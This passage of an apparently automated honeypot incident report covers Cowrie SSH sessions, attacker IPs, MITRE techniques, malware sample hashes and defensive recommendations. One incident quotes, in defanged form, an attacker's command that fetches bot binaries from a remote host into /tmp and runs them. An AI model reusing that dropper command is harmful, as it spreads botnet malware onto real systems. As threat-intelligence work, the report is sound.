| `2026-08-13 08:29:23` | `cowrie.client.kex` |
| `2026-08-13 08:29:24` | `cowrie.login.success` |
| `2026-08-13 08:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e5f815aa994

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:29 |
| **Last Seen** | 2026-08-13 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:29:26` | `cowrie.session.connect` |
| `2026-08-13 08:29:26` | `cowrie.client.version` |
| `2026-08-13 08:29:26` | `cowrie.client.kex` |
| `2026-08-13 08:29:27` | `cowrie.login.success` |
| `2026-08-13 08:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb5529c39f1

| Field | Detail |
|---|---|
| **Source IP** | `92.5.66[.]49` |
| **First Seen** | 2026-08-13 08:39 |
| **Last Seen** | 2026-08-13 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /;wget hxxp://92.5.66[.]49:8080/bot.386 -O bot.386 2>/dev/null; chmod 777 bot.386 2>/dev/null; ./bot.386 &>/dev/null &wget hxxp://92.5.66[.]49:8080/bot.amd64 -O bot.amd64 2>/dev/null; chmod 777 bot.amd64 2>/dev/null; ./bot.amd64 &>/dev/null &wget hxxp://92.5.66[.]49:8080/bot.arm -O bot.arm 2>/dev/null; chmod 777 bot.arm 2>/dev/null; ./bot.arm &>/dev/null &wget hxxp://92.5.66[.]49:8080/bot.arm64 -O bot.arm64 2>/dev/null; chmod 777 bot.arm64 2>/dev/null; ./bot.arm64 &>` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:39:52` | `cowrie.session.connect` |
| `2026-08-13 08:39:52` | `cowrie.login.success` |
| `2026-08-13 08:39:53` | `cowrie.session.params` |
| `2026-08-13 08:39:53` | `cowrie.command.input` |
| `2026-08-13 08:39:53` | `cowrie.log.closed` |
| `2026-08-13 08:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.66[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.5.66[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7faaa912305

| Field | Detail |
|---|---|
| **Source IP** | `92.5.66[.]49` |
| **First Seen** | 2026-08-13 08:43 |
| **Last Seen** | 2026-08-13 08:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:43:03` | `cowrie.session.connect` |
| `2026-08-13 08:43:03` | `cowrie.client.version` |
| `2026-08-13 08:43:03` | `cowrie.client.kex` |
| `2026-08-13 08:43:04` | `cowrie.login.success` |
| `2026-08-13 08:43:04` | `cowrie.session.params` |
| `2026-08-13 08:43:04` | `cowrie.command.input` |
| `2026-08-13 08:43:05` | `cowrie.log.closed` |
| `2026-08-13 08:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.66[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.5.66[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83348093a29f

| Field | Detail |
|---|---|
| **Source IP** | `92.5.66[.]49` |
| **First Seen** | 2026-08-13 08:43 |
| **Last Seen** | 2026-08-13 08:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:43:14` | `cowrie.session.connect` |
| `2026-08-13 08:43:14` | `cowrie.client.version` |
| `2026-08-13 08:43:14` | `cowrie.client.kex` |
| `2026-08-13 08:43:14` | `cowrie.login.success` |
| `2026-08-13 08:43:15` | `cowrie.session.params` |
| `2026-08-13 08:43:15` | `cowrie.command.input` |
| `2026-08-13 08:43:15` | `cowrie.log.closed` |
| `2026-08-13 08:43:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.66[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.5.66[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2267d3c85309

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-13 08:45 |
| **Last Seen** | 2026-08-13 08:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:45:33` | `cowrie.session.connect` |
| `2026-08-13 08:45:33` | `cowrie.client.version` |
| `2026-08-13 08:45:33` | `cowrie.client.kex` |
| `2026-08-13 08:45:35` | `cowrie.login.success` |
| `2026-08-13 08:45:35` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dbc0a2c073d

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-08-13 08:45 |
| **Last Seen** | 2026-08-13 08:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:45:40` | `cowrie.session.connect` |
| `2026-08-13 08:45:40` | `cowrie.client.version` |
| `2026-08-13 08:45:40` | `cowrie.client.kex` |
| `2026-08-13 08:45:41` | `cowrie.login.success` |
| `2026-08-13 08:45:42` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd25fd093e5

| Field | Detail |
|---|---|
| **Source IP** | `112.6.127[.]244` |
| **First Seen** | 2026-08-13 08:45 |
| **Last Seen** | 2026-08-13 08:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:45:45` | `cowrie.session.connect` |
| `2026-08-13 08:45:46` | `cowrie.client.version` |
| `2026-08-13 08:45:46` | `cowrie.client.kex` |
| `2026-08-13 08:45:48` | `cowrie.login.success` |
| `2026-08-13 08:45:50` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.127[.]244` to AbuseIPDB if not already reported
- [ ] Block `112.6.127[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-275af545e7e6

| Field | Detail |
|---|---|
| **Source IP** | `119.152.54[.]111` |
| **First Seen** | 2026-08-13 08:45 |
| **Last Seen** | 2026-08-13 08:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:45:59` | `cowrie.session.connect` |
| `2026-08-13 08:46:01` | `cowrie.client.version` |
| `2026-08-13 08:46:01` | `cowrie.client.kex` |
| `2026-08-13 08:46:02` | `cowrie.login.success` |
| `2026-08-13 08:46:05` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.54[.]111` to AbuseIPDB if not already reported
- [ ] Block `119.152.54[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d85c9d0e44

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-08-13 08:49 |
| **Last Seen** | 2026-08-13 08:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:49:32` | `cowrie.session.connect` |
| `2026-08-13 08:49:33` | `cowrie.client.version` |
| `2026-08-13 08:49:33` | `cowrie.client.kex` |
| `2026-08-13 08:49:35` | `cowrie.login.success` |
| `2026-08-13 08:49:36` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5ecdfb119a

| Field | Detail |
|---|---|
| **Source IP** | `176.12.132[.]63` |
| **First Seen** | 2026-08-13 08:49 |
| **Last Seen** | 2026-08-13 08:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:49:45` | `cowrie.session.connect` |
| `2026-08-13 08:49:46` | `cowrie.client.version` |
| `2026-08-13 08:49:46` | `cowrie.client.kex` |
| `2026-08-13 08:49:47` | `cowrie.login.success` |
| `2026-08-13 08:49:48` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.12.132[.]63` to AbuseIPDB if not already reported
- [ ] Block `176.12.132[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `203.25.208[.]110` | **23** | 2026-08-13 07:57 | 2026-08-13 08:54 | 41m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **13** | 2026-08-13 06:56 | 2026-08-13 08:43 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `194.165.16[.]161` | **6** | 2026-08-13 07:28 | 2026-08-13 08:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-13 06:55 | 2026-08-13 08:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **4** | 2026-08-13 07:54 | 2026-08-13 08:39 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]115` | **3** | 2026-08-13 08:36 | 2026-08-13 08:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-13 07:09 | 2026-08-13 07:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-08-13 08:50 | 2026-08-13 08:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | **2** | 2026-08-13 08:36 | 2026-08-13 08:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]179` | **2** | 2026-08-13 07:12 | 2026-08-13 07:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | **2** | 2026-08-13 06:56 | 2026-08-13 06:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-08-13 08:12 | 2026-08-13 08:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-13 07:29 | 2026-08-13 07:30 | 33s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-08-13 07:55 | 2026-08-13 07:55 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `160.154.52[.]91` | 1 | 2026-08-13 07:19 | 2026-08-13 07:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-13 08:20 | 2026-08-13 08:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.142.73[.]177` | 1 | 2026-08-13 08:26 | 2026-08-13 08:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-08-13 07:16 | 2026-08-13 07:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.157[.]190` | 1 | 2026-08-13 08:49 | 2026-08-13 08:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `209.99.188[.]69` | 1 | 2026-08-13 07:49 | 2026-08-13 07:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-08-13 07:26 | 2026-08-13 07:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.189.253[.]198` | 1 | 2026-08-13 08:11 | 2026-08-13 08:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.139.245[.]137` | 1 | 2026-08-13 07:46 | 2026-08-13 07:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.52.202[.]31` | 1 | 2026-08-13 08:29 | 2026-08-13 08:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.211.32[.]176` | 1 | 2026-08-13 08:48 | 2026-08-13 08:48 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-13 07:08 | 2026-08-13 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]203` | 1 | 2026-08-13 08:47 | 2026-08-13 08:47 | 18s | 0 | `T1592` | 🟢 LOW |
| `82.123.158[.]158` | 1 | 2026-08-13 08:37 | 2026-08-13 08:37 | 12s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-08-13 07:06 | 2026-08-13 07:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.226.56[.]106` | 1 | 2026-08-13 07:26 | 2026-08-13 07:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.42[.]227` | 1 | 2026-08-13 07:07 | 2026-08-13 07:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.5.66[.]49` | 1 | 2026-08-13 08:43 | 2026-08-13 08:43 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 47/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.178.194[.]128` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `82.123.158[.]158` | FR | Orange S.A. | **100** ⚠️ | 3 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `49.206.194[.]29` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 50 |
| `178.178.194[.]192` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `45.33.14[.]197` | US | Linode | **100** ⚠️ | 50 |
| `209.99.188[.]69` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 1 |
| `66.132.186[.]203` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `117.211.15[.]106` | IN | O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `220.189.253[.]198` | CN | Zhejiang Hangwan Automobile SPAREPARTS ENTERPRISE CO.,LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 257 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 235 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
